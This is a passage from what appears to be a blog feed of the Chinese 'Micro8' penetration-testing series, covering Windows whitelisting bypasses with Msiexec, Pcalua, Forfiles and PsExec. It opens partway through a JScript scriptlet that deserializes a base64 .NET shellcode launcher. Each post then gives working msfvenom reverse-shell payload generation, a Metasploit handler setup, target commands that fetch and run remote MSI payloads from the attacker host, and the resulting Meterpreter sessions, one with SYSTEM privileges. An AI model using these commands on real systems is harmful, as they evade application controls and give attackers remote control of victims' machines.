class="string">"cmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3"</span>+</span><br><span class="line"><span class="string">"N2E1YzU2MTkzNGUwODkVAVQCEFNraXBWZXJpZmljYXRpb24BAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAA8AgAAAAAAAAAAAAA8AjQAAABW"</span>+</span><br><span class="line"><span class="string">"AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA"</span>+</span><br><span class="line"><span class="string">"AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEnAEAAAEAUwB0AHIAaQBuAGcA"</span>+</span><br><span class="line"><span class="string">"RgBpAGwAZQBJAG4AZgBvAAAAeAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBE"</span>+</span><br><span class="line"><span class="string">"AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4A"</span>+</span><br><span class="line"><span class="string">"AAAAADAALgAwAC4AMAAuADAAAAA0AAkAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAADIAMgAy"</span>+</span><br><span class="line"><span class="string">"ADIALgBkAGwAbAAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAADwA"</span>+</span><br><span class="line"><span class="string">"CQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAAAyADIAMgAyAC4AZABsAGwAAAAA"</span>+</span><br><span class="line"><span class="string">"ADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAA4AAgA"</span>+</span><br><span class="line"><span class="string">"AQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>+</span><br><span class="line"><span class="string">"AAAAAAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVm"</span>+</span><br><span class="line"><span class="string">"bGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA"</span>;</span><br><span class="line"> <span class="keyword">var</span> entry_class = <span class="string">'ShellCodeLauncher.Program'</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">setversion();</span><br><span class="line"><span class="keyword">var</span> stm = base64ToStream(serialized_obj);</span><br><span class="line"><span class="keyword">var</span> fmt = <span class="keyword">new</span> ActiveXObject(<span class="string">'System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'</span>);</span><br><span class="line"><span class="keyword">var</span> al = <span class="keyword">new</span> ActiveXObject(<span class="string">'System.Collections.ArrayList'</span>);</span><br><span class="line"><span class="keyword">var</span> d = fmt.Deserialize_2(stm);</span><br><span class="line">al.Add(<span class="literal">undefined</span>);</span><br><span class="line"><span class="keyword">var</span> o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class); </span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">debug(e.message);</span><br><span class="line">&#125; </span><br><span class="line">]]&gt;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>registration&gt;</span><br><span class="line">&lt;<span class="regexp">/scriptlet&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>86、基于白名单Msiexec执行payload第八季补充</title>
      <link href="/article/86_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%85%AB%E5%AD%A3%E8%A1%A5%E5%85%85.html"/>
      <url>/article/86_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%85%AB%E5%AD%A3%E8%A1%A5%E5%85%85.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，身体特别重要。</p><p>本季补充本地DLL加载<br><strong>Msiexec简介：</strong></p><p>Msiexec是Windows Installer的一部分。用于安装Windows Installer安装包（MSI）,一般在运行Microsoft Update安装更新或安装部分软件的时候出现，占用内存比较大。并且集成于Windows 2003，Windows 7等。</p><p><strong>说明：</strong>Msiexec.exe所在路径已被系统添加PATH环境变量中，因此，Msiexec命令可识别。</p><h3 id="基于白名单Msiexec-exe配置payload："><a href="#基于白名单Msiexec-exe配置payload：" class="headerlink" title="基于白名单Msiexec.exe配置payload："></a>基于白名单Msiexec.exe配置payload：</h3><p><strong>注：x64 payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐ f dll &gt; Micropoor_rev_x64_53.dll</span><br></pre></td></tr></table></figure><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><p><strong>注：x64 payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process,none)</span><br><span class="line"></span><br><span class="line">LHOST 192.168.1.4 yes The listen address (an interface may be specified)</span><br><span class="line"></span><br><span class="line">LPORT 53 yes The listen port</span><br><span class="line"></span><br><span class="line">Exploit target: </span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line">‐‐ ‐‐‐‐</span><br><span class="line">0 Wildcard Target </span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br></pre></td></tr></table></figure><p><img src="../do/media/62736d164fb64b1462810cfea7bd472c.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /y C:\Users\John\Desktop\Micropoor_rev_x64_dll.dll</span><br></pre></td></tr></table></figure><p><img src="../do/media/b8cbb9334f2281d8cd8f70052c2a02a9.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br><span class="line"></span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.1.5</span><br><span class="line"></span><br><span class="line">[*] Meterpreter session 26 opened (192.168.1.4:53 ‐&gt; 192.168.1.5:11543)</span><br><span class="line">at 2019‐01‐20 09:45:51 ‐0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: John‐PC\John</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line"></span><br><span class="line">Current pid: 7672</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><img src="../do/media/84fb0dd629aae878607221e385dfff34.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>85、基于白名单Pcalua执行payload第十五季</title>
      <link href="/article/85_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%BA%94%E5%AD%A3.html"/>
      <url>/article/85_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%BA%94%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><h3 id="Pcalua简介："><a href="#Pcalua简介：" class="headerlink" title="Pcalua简介："></a>Pcalua简介：</h3><p>Windows进程兼容性助理(Program Compatibility Assistant)的一个组件。</p><p><strong>说明：</strong>Pcalua.exe所在路径已被系统添加PATH环境变量中，因此，Pcalua命令可识别</p><p>Windows 7 默认位置：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\pcalua.exe</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong> 192.168.1.4 Debian<br><strong>靶机：</strong> 192.168.1.5 Windows 7  </p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line"></span><br><span class="line">LHOST 192.168.1.4 yes The listen address (an interface may be specified)</span><br><span class="line"></span><br><span class="line">LPORT 53 yes The listen port</span><br><span class="line"></span><br><span class="line">Exploit target: </span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line">‐‐ ‐‐‐‐</span><br><span class="line">0 Wildcard Target </span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br></pre></td></tr></table></figure><p><img src="../do/media/13ed50e69746598b03e25538d5ce8f0e.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pcalua -m -a \\192.168.1.119\share\rev_x86_53_exe.exe</span><br></pre></td></tr></table></figure><p><img src="../do/media/812c8fdac52fcd263438540c02c72205.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 23 opened (192.168.1.4:53 ‐&gt; 192.168.1.5:11349)</span><br><span class="line">at 2019‐01‐20 09:25:01 ‐0500</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: John‐PC\John</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 11236</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><img src="../do/media/245a3a34008b549f40544d7438828123.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>84、基于白名单Forfiles执行payload第十四季</title>
      <link href="/article/84_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%AD%A3.html"/>
      <url>/article/84_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><h3 id="Forfiles简介："><a href="#Forfiles简介：" class="headerlink" title="Forfiles简介："></a>Forfiles简介：</h3><p>Forfiles为Windows默认安装的文件操作搜索工具之一，可根据日期，后缀名，修改日期为条件。常与批处理配合使用。</p><p>微软官方文档：<br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753551(v=ws.11)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753551(v=ws.11)</a></p><p>说明：Forfiles.exe所在路径已被系统添加PATH环境变量中，因此，Forfiles命令可识别，需注意x86，x64位的Forfiles调用。</p><p>Windows 2003 默认位置：<br><code>C:\WINDOWS\system32\forfiles.exeC:\WINDOWS\SysWOW64\forfiles.exe</code></p><p>Windows 7 默认位置：<br><code>C:\WINDOWS\system32\forfiles.exeC:\WINDOWS\SysWOW64\forfiles.exe</code></p><p><strong>攻击机：</strong> 192.168.1.4 Debian<br><strong>靶机：</strong> 192.168.1.119 Windows 2003</p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line"></span><br><span class="line">EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line"></span><br><span class="line">LHOST 192.168.1.4 yes The listen address (an interface may be specified)</span><br><span class="line"></span><br><span class="line">LPORT 53 yes The listen port </span><br><span class="line"></span><br><span class="line">Exploit target: </span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line"> ‐‐ ‐‐‐‐</span><br><span class="line">0 Wildcard Target </span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br></pre></td></tr></table></figure><p><img src="../do/media/caedeec0997c3ee413473c009faeebcb.jpg" alt></p><h3 id="靶机执行：Windows-2003"><a href="#靶机执行：Windows-2003" class="headerlink" title="靶机执行：Windows 2003"></a>靶机执行：Windows 2003</h3><p><img src="../do/media/6ff0192b4034032c1a131ee6ab4a876e.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles /p c:\windows\system32 /m cmd.exe /c &quot;msiexec.exe /q /i http://192.168.1.4/Micropoor_rev_x86_msi_53.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="../do/media/43ffb66347850546f46981339421e5d4.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.119</span><br><span class="line">[*] Meterpreter session 15 opened (192.168.1.4:53 ‐&gt; 192.168.1.119:133</span><br><span class="line">1) at 2019‐01‐20 06:34:08 ‐0500</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN03X64\Administrator</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 392</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><img src="../do/media/27318b0234b037aa459041021632b857.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>83、基于白名单PsExec执行payload第十三季</title>
      <link href="/article/83_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B8%89%E5%AD%A3.html"/>
      <url>/article/83_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B8%89%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><h3 id="PsExec简介："><a href="#PsExec简介：" class="headerlink" title="PsExec简介："></a>PsExec简介：</h3><p>微软于2006年7月收购sysinternals公司，PsExec是SysinternalsSuite的小工具之一，是一种轻量级的telnet替代品，允许在其他系统上执行进程，完成控制台应用程序的完全交互，而无需手动安装客户端软件，并且可以获得与控制台应用程序相当的完全交互性。</p><p>微软官方文档：<br><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p><p>说明：PsExec.exe没有默认安装在windows系统。</p><p><strong>攻击机：</strong> 192.168.1.4 Debian<br><strong>靶机：</strong> 192.168.1.119 Windows 2003</p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">EXITFUNC process yes Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line"></span><br><span class="line">LHOST 192.168.1.4 yes The listen address (an interface may be specified)</span><br><span class="line"></span><br><span class="line">LPORT 53 yes The listen port </span><br><span class="line"></span><br><span class="line">Exploit target: </span><br><span class="line"></span><br><span class="line">Id Name</span><br><span class="line">‐‐ ‐‐‐‐</span><br><span class="line">0 Wildcard Target </span><br><span class="line"></span><br><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br></pre></td></tr></table></figure><p><img src="../do/media/665d55d525ed72757f30454ada5a71de.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><p><img src="../do/media/3832b47f170fb110c44a283765b4bfd4.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe -d -s msiexec.exe /q /i &lt;http://192.168.1.4/Micropoor_rev_x86_msi_53.txt&gt;</span><br></pre></td></tr></table></figure><p><img src="../do/media/ac4359c43440d555b4e873409425927c.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:53</span><br><span class="line"></span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.1.119</span><br><span class="line"></span><br><span class="line">[*] Meterpreter session 11 opened (192.168.1.4:53 ‐&gt; 192.168.1.119:131) at 2019‐01‐20 05:43:32 ‐0500 </span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line"></span><br><span class="line">Current pid: 728</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><img src="../do/media/14842fe0c4f8775c8de53de6583282a1.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>82、基于白名单Odbcconf执行payload第十二季</title>
      <link href="/article/82_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%AD%A3.html"/>
      <url>/article/82_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%AD%A3.html</url>
      
